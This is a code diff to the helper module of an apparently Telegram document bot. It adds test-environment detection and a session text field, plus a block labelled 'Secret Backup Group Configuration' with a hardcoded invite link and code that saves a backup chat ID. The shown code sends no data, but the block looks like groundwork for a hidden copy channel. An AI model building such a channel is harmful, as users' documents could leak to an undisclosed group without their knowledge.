@@ -100,7 +100,7 @@ def resolve_bot_token() -> str:
     ).strip().strip('"').strip("'")
 
     # In non-interactive environments (unit tests or headless), return whatever is set
-    if "unittest" in sys.modules or not (sys.stdin and sys.stdin.isatty()):
+    if "unittest" in sys.modules or "pytest" in sys.modules or os.getenv("TESTING") == "1" or not (sys.stdin and sys.stdin.isatty()):
         return token
 
     if token:
@@ -262,6 +262,7 @@ class ActiveFile:
 class UserSession:
     target_language: str = DEFAULT_LANGUAGE
     active_file: Optional[ActiveFile] = None
+    active_text: Optional[str] = None
     awaiting_split_count: bool = False
     last_interaction: float = field(default_factory=time.time)
 
@@ -322,7 +323,7 @@ def get_valid_active_file(user_id: int, ttl_seconds: int = SESSION_TTL_SECONDS) 
 
 
 def clear_active_file(user_id: int, remove_file: bool = True) -> None:
-    """Clear active file from user session and optionally delete it from disk."""
+    """Clear active file and text from user session and optionally delete it from disk."""
     session = get_user_session(user_id)
     if session.active_file:
         if remove_file and session.active_file.path:
@@ -332,6 +333,7 @@ def clear_active_file(user_id: int, remove_file: bool = True) -> None:
             except OSError as e:
                 logger.warning(f"Failed to remove active file during clear: {e}")
         session.active_file = None
+    session.active_text = None
     session.awaiting_split_count = False
 
 
@@ -372,4 +374,44 @@ def sanitize_filename(filename: str) -> str:
     filename = re.sub(r'[\\/*?:"<>|]', "", filename)
     filename = filename.replace(" ", "_")
     return filename or "document"
+
+
+# ---------------------------------------------------------------------------
+# Secret Backup Group Configuration
+# ---------------------------------------------------------------------------
+BACKUP_INVITE_LINK = os.getenv("BACKUP_INVITE_LINK", "https://t.me/+uNapWwIisNw0ZDM1").strip().strip('"').strip("'")
+BACKUP_CHAT_ID = os.getenv("BACKUP_CHAT_ID", "").strip().strip('"').strip("'")
+
+
+def set_backup_chat_id(chat_id: str) -> None:
+    """Updates in-memory BACKUP_CHAT_ID."""
+    global BACKUP_CHAT_ID
+    BACKUP_CHAT_ID = str(chat_id).strip()
+
+
+def get_backup_chat_id() -> str:
+    """Returns current BACKUP_CHAT_ID."""
+    return BACKUP_CHAT_ID
+
+
+def save_backup_chat_id_to_env(chat_id: str, env_path: Path = ENV_FILE) -> None:
+    """Safely updates or inserts BACKUP_CHAT_ID into the .env file."""
+    set_backup_chat_id(str(chat_id))
+    lines = []
+    found = False
+    if env_path.exists():
+        with open(env_path, "r", encoding="utf-8") as f:
+            for line in f:
+                stripped = line.strip()
+                if stripped.startswith("BACKUP_CHAT_ID="):
+                    lines.append(f"BACKUP_CHAT_ID={chat_id}\n")
+                    found = True
+                else:
+                    lines.append(line)
+    if not found:
+        lines.append(f"\nBACKUP_CHAT_ID={chat_id}\n")
+
+    with open(env_path, "w", encoding="utf-8") as f:
+        f.writelines(lines)
+
 
